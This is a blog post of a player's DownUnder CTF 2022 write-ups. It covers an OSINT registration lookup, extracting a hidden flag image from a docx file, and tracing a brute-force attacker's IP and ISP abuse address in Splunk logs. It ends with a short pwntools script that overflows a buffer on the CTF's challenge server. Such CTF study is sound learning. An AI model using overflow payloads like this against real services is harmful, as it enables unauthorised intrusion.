---
layout: post
title: "DownUnder CTF 2022 Writeups"
date: 2022-09-25 17:15:00 +0530
categories: CTF
tags: september-2022
---

Hey fellow hackers, Welcome back to my another writeup. This week I played the **Downunder CTF 2022**. I wasn't able to solve many challenges since I was busy with some other tasks but I did manage to capture flags for some of the challenges. I managed to grab **350** points and my team ended up at **707th** position. Hope you enjoy my writeups and get to learn something new.

<br>
<h1><b><u>OSINT</u></b></h1>

<br><img src="/assets/images/downunder_ctf_2022/score.png" alt="score">

<br>
## Honk Honk

<br><img src="/assets/images/downunder_ctf_2022/honk_honk_1.png" alt="honk_honk">

<br>
As per this challenge, we have to figure out the date when's the CTP (Compulsory Third Party) insurance is about to be expired. There are many webistes out there to check the CTP repo status and the date when its about to expire. So, I decided to use the [Service NSW](https://free-rego-check.service.nsw.gov.au/) website to find the CTP rego status.

<br><img src="/assets/images/downunder_ctf_2022/honk_honk_2.png" alt="honk_honk">

<br>
I inputted the given car registration number which is **23HONK** and I got the complete details of the registration details. 

<br><img src="/assets/images/downunder_ctf_2022/honk_honk_3.png" alt="honk_honk">

<br><img src="/assets/images/downunder_ctf_2022/honk_honk_4.png" alt="honk_honk">

<br>
So, as you can see that the CTP insurance expire date is **19 July 2023**.

Therefore, the flag for this challenge would be:
> DUCTF{19/07/2023}

<br>
<h1><b><u>DFIR</u></b></h1>

<br>
## Dox Me

<br><img src="/assets/images/downunder_ctf_2022/dox_me_1.png" alt="dox_me">

<br>
In this challenge, we are give a **doxme** file and since the category of this challenge is **DFIR** so I assume that its related to the forensics. I downloaded the file and ran the **file** on it.

<br><img src="/assets/images/downunder_ctf_2022/dox_me_2.png" alt="dox_me">

<br>
`file` command revealed that this is a **Microsoft OOXML** and after some google research, I found out that this is a word **docx** file. I added the **.docx** extension to the file so that I can see what does the file contains.

<br><img src="/assets/images/downunder_ctf_2022/dox_me_3.png" alt="dox_me">

<br>
We can see the half part of the flag in the document but we need the complete flag before we can submit it. After this, I tried various methods to find other half of the flag such as running `strings` commands to find the complete flag on the docx file but then I remember that I can also unzip the docx file and extract the files.
```
unzip doxme.docx -d doxme
```

<br><img src="/assets/images/downunder_ctf_2022/dox_me_4.png" alt="dox_me">

<br>
After browsing through all these files, I came across two PNGs image files in `doxme/word/media` which is unusal since we only saw one image when we opened up the file. So, our flag must be in the other image. 

<br><img src="/assets/images/downunder_ctf_2022/dox_me_5.png" alt="dox_me">

<br>
Found the other half part of the flag. Now, our flag is completed:
> DUCTF{WOrd_D0Cs_Ar3_R34L1Y_W3ird}

<br>
## Shop-Setup&Disclaimer

<br><img src="/assets/images/downunder_ctf_2022/shop_setup_1.png" alt="shop_setup">

<br>
The provided json data file is not in the proper format so first of all I fixed the format of the data using the VS code editor.

<br><img src="/assets/images/downunder_ctf_2022/shop_setup_2.png" alt="shop_setup">

> IAgreeToTheTeasAndTheSeas

<br>
## Shop-Knock Knock Knock

<br><img src="/assets/images/downunder_ctf_2022/shop_knock_knock_knock_1.png" alt="shop_knock_knock_knock">

<br>
I loaded the data up in [Splunk Cloud](https://www.splunk.com/) instance. Now, its time to search & analyze the log data.

<br><img src="/assets/images/downunder_ctf_2022/shop_knock_knock_knock_2.png" alt="shop_knock_knock_knock">

<br>
Our objective is to find the email address of the ISP of the attackers. So, first of all, we have to find the IP address of the attacker. In our splunk cloud instance, we can see that the most requests came from the `58.164.62.91` IP address so this is probably the IP address of the attacker.

<br><img src="/assets/images/downunder_ctf_2022/shop_knock_knock_knock_3.png" alt="shop_knock_knock_knock">

<br>
Also, the time span between the login requests is very less as you can see below that the time span between the requests is between 2-3 seconds on average. So, this proves that this is the IP address of our attacker. 

<br><img src="/assets/images/downunder_ctf_2022/shop_knock_knock_knock_4.png" alt="shop_knock_knock_knock">

<br> The only step left to do is to find the ISP of this IP address and the email address of the ISP. So for this, I used [Whois Domain Tools](https://whois.domaintools.com/). This gave me the name of the ISP (**Telstra Internet**) and the email address of the ISP (**abuse@telstra.net**).

<br><img src="/assets/images/downunder_ctf_2022/shop_knock_knock_knock_5.png" alt="shop_knock_knock_knock">

> abuse@telstra.net

<br>
<h1><b><u>PWN</u></b></h1>

<br>
## Babyp(y)wn

<br><img src="/assets/images/downunder_ctf_2022/baby_pywn_1.png" alt="baby_pywn">

<br>
Baby Pwn is a pwn challenge in which I have to exploit the buffer overflow vulnerability in order to capture the flag. So, I installed `pwntools` and I wrote a simple script to fetch the flag.
```
from pwn import *

conn_obj = remote("2022.ductf.dev", 30021)
conn_obj.sendline(b"f" * 512 + b"DUCTF")

flag = conn_obj.recvline().decode()
print(flag)
```

<br>
After running the above script, I got the baby flag:
> DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}

<br>
**So folks, that's it for this writeup. I will be back with more challenges in the next writeup. So, till then be safe and stay happy 😊**